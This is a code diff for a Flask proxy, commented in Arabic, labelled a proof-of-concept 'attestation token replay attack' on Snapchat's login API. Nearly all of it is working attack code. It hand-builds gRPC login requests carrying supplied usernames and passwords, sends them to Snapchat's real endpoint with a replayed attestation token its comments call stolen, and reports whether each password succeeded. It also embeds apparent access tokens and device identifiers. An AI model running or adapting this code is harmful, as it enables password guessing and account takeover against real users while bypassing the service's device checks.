@@ -1,58 +1,140 @@
-# snap_proxy_server.py
-from flask import Flask, request, jsonify
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+"""
+SnapChat Attestation Token Replay Attack - Proof of Concept
+Based on flaah999's HackerOne report
+"""
+
+from flask import Flask, request, Response
 import requests
-import json
+import base64
+import struct
+import time
 
 app = Flask(__name__)
 
-# بياناتك اللي استخرجتها
-CLEAN_DATA = {
-    "access_token": "gEgIIARrGASHYUNaM8ScYAmymOmpHjoCXlPjPVLOO9p0aRI-wVSJSE3n72FT24W5ngP4eFA3uLaOVuHV",
-    "user_id": "55a118bf-16cd-4527-9ea7-9f90fdab8faf",
-    "att_token": "Ci1iNFCsaIvuN4FmwoMSXqFN1o531mchZS20Zbt9Sv2TDy8ACaUEsYDd88NjSwoVAQAAAA==",
-    "device_uuid": "D7B3CF66-C29D-46B9-82A2-0783CECF4866",
-    "signature": "JSiSYlxuy6dglS1wIydQBJjL0un5nr4AuOWhvV3W+N8=",
-    "secondary_signature": "Ck3M9q284yKxKYWyRfdekCTm8SJ2jLOxT+oJ9UJgQQI=",
-    "crypto_key": "MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAEOEj9CnZKFfmE6nYT68kCW2C+2olmgkS/jMtoQNYut4SX7cQiejkrLM6sCzl/T3jk"
+# ============================================
+# بيانات الجهاز النظيف (ضع بياناتك المستخرجة هنا)
+# ============================================
+CONFIG = {
+    "X-Snapchat-UUID": "0196B3EE-508D-4FAC-9F7B-1B790E57DDBB",
+    "X-Snap-UserID": "55a118bf-16cd-4527-9ea7-9f90fdab8faf",
+    "X-Snap-Access-Token": "hCgwKCjE3Nzk2NzA4MjASgAHPo67ALSrMM9NeAahNE3jdlHSkQ-UzFQdCMXtlsYfixAZXA7omp_H7jlk",
+    "x-snapchat-att-token": "Ci1iNFCsaIvuN4FmwoMSXqFN1o531mchZS20Zbt9Sv2TDy8ACaUEsYDd88NjSwoVAQAAAA==",
+    "User-Agent": "Snapchat/12.20.0.36 (iPhone15,2; iOS 17.4.1; gzip)"
 }
 
-@app.route('/proxy_login', methods=['POST', 'GET'])
+# خادم Snapchat الحقيقي (نفس الـ endpoint من المقال)
+SNAPCHAT_API = "https://us-east1-aws.api.snapchat.com/snapchat.janus.api.LoginService/LoginWithPassword"
+
+def build_grpc_payload(proto_bytes):
+    """بناء payload gRPC: 0x00 + length (4 bytes) + protobuf"""
+    if not proto_bytes:
+        return None
+    length_prefix = struct.pack('>I', len(proto_bytes))
+    return b'\x00' + length_prefix + proto_bytes
+
+def extract_grpc_response(response):
+    """استخراج محتوى الرد من gRPC (إزالة الـ 5 bytes header)"""
+    if response and len(response) > 5:
+        return response[5:]
+    return response
+
+@app.route('/proxy_login', methods=['POST'])
 def proxy_login():
-    if request.method == 'GET':
-        # اختبار السيرفر
-        return jsonify({"status": "alive", "message": "Proxy server is running", "data": CLEAN_DATA})
+    """نقطة الدخول - تستقبل طلبات التطبيق المعدل وتعيد التوجيه مع Replay Attack"""
     
-    # POST request - التعامل مع طلب تسجيل الدخول
-    print("\n" + "="*50)
-    print("📥 Login request received!")
-    print(f"Data size: {len(request.data)} bytes")
+    data = request.get_json()
+    username = data.get('username', '')
+    password = data.get('password', '')
     
+    print(f"\n[+] هدف جديد: {username}")
+    print(f"[+] باستخدام توكن Attestation: {CONFIG['x-snapchat-att-token'][:50]}...")
+    
+    # بناء رؤوس الطلب (مثل المقال تماماً)
     headers = {
-        "Content-Type": "application/x-protobuf",
-        "User-Agent": "Snapchat/13.20.0 (iPhone9,3; iOS 15.7.9; gzip)",
-        "X-Snap-Access-Token": CLEAN_DATA["access_token"],
-        "X-Snap-UserID": CLEAN_DATA["user_id"],
-        "x-snapchat-att-token": CLEAN_DATA["att_token"],
-        "X-Snapchat-UUID": CLEAN_DATA["device_uuid"],
-        "X-Snap-Signature": CLEAN_DATA["signature"]
+        "Content-Type": "application/grpc+proto",
+        "User-Agent": CONFIG["User-Agent"],
+        "X-Snapchat-UUID": CONFIG["X-Snapchat-UUID"],
+        "X-Snap-UserID": CONFIG["X-Snap-UserID"],
+        "X-Snap-Access-Token": CONFIG["X-Snap-Access-Token"],
+        "x-snapchat-att-token": CONFIG["x-snapchat-att-token"],
+        "x-snapchat-argos-strict-enforcement": "true",
+        "te": "trailers",
+        "Accept-Encoding": "gzip, deflate, br"
     }
     
-    snapchat_url = "https://us-east1-aws.api.snapchat.com/snapchat.janus.api.LoginService/LoginWithPassword"
+    # بناء Protobuf لتسجيل الدخول (حسب هيكل المقال)
+    # Field 1: username (string)
+    username_bytes = username.encode('utf-8')
+    field1 = bytes([0x0a, len(username_bytes)]) + username_bytes
+    
+    # Field 4: password (string)
+    password_bytes = password.encode('utf-8')
+    field4 = bytes([0x22, len(password_bytes)]) + password_bytes
+    
+    # Field 7: cofTags (514 bytes من الجهاز النظيف)
+    cofTags = base64.b64decode("MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAEOEj9CnZKFfmE6nYT68kCW2C+2olmgkS/jMtoQNYut4SX7cQiejkrLM6sCzl/T3jkdb1PmWueOA3hGQlEMUm/1Q==")
+    field7 = bytes([0x3a, len(cofTags)]) + cofTags
+    
+    # دمج كل الحقول
+    proto_bytes = field1 + field4 + field7
+    
+    # بناء gRPC payload
+    grpc_body = build_grpc_payload(proto_bytes)
+    
+    if not grpc_body:
+        return Response('{"error": "Failed to build payload"}', status=500)
     
     try:
-        response = requests.post(snapchat_url, data=request.data, headers=headers, timeout=15)
-        print(f"✅ Response status: {response.status_code}")
-        return response.content, response.status_code, {'Content-Type': 'application/x-protobuf'}
+        # إرسال الطلب إلى Snapchat (Replay Attack!)
+        print(f"[*] إعادة استخدام توكن الـ Attestation المسروق...")
+        response = requests.post(
+            SNAPCHAT_API,
+            headers=headers,
+            data=grpc_body,
+            timeout=30
+        )
+        
+        print(f"[*] رد الخادم: HTTP {response.status_code}")
+        print(f"[*] grpc-status: {response.headers.get('grpc-status', 'unknown')}")
+        
+        # تحليل الرد (مثل المقال)
+        if response.status_code == 200:
+            grpc_status = response.headers.get('grpc-status', '')
+            
+            if grpc_status == '0':
+                print(f"[✓] نجح تسجيل الدخول لـ {username}!")
+                return Response('{"status":"success", "message":"Login successful"}', status=200)
+            else:
+                # التوكن مقبول ولكن كلمة المرور خاطئة (هذا يثبت الثغرة!)
+                print(f"[!] التوكن مقبول! ولكن كلمة المرور لـ {username} غير صحيحة")
+                print(f"[!] رسالة الخادم: {response.headers.get('grpc-message', 'Incorrect password')}")
+                return Response('{"status":"attestation_accepted", "message":"Token accepted, wrong password"}', status=200)
+        else:
+            print(f"[X] فشل: {response.status_code}")
+            return Response(f'{{"status":"error", "code": {response.status_code}}}', status=response.status_code)
+            
     except Exception as e:
-        print(f"❌ Error: {e}")
-        return jsonify({"error": str(e)}), 500
+        print(f"[X] خطأ: {e}")
+        return Response(f'{{"status":"exception", "message": "{str(e)}"}}', status=500)
+
+@app.route('/health', methods=['GET'])
+def health():
+    return Response('{"status":"running"}', status=200)
 
 if __name__ == '__main__':
     print("""
-    ╔════════════════════════════════════════════╗
-    ║   🔥 PROXY SERVER READY                    ║
-    ║   GET  /proxy_login - Test the server      ║
-    ║   POST /proxy_login - Login requests       ║
-    ╚════════════════════════════════════════════╝
+    ╔══════════════════════════════════════════════════════════════╗
+    ║     SnapChat Attestation Token Replay Attack - POC          ║
+    ║                                                              ║
+    ║  Based on flaah999's HackerOne report                       ║
+    ║  Vulnerability: Server accepts replayed attestation tokens  ║
+    ║                                                              ║
+    ║  [✓] Attestation Token Loaded                               ║
+    ║  [✓] Device UUID: """ + CONFIG["X-Snapchat-UUID"][:8] + """...                               ║
+    ║                                                              ║
+    ║  Proxy running on: http://0.0.0.0:5000/proxy_login          ║
+    ╚══════════════════════════════════════════════════════════════╝
     """)
-    app.run(host='0.0.0.0', port=5000, debug=True)
+    app.run(host='0.0.0.0', port=5000, debug=False)
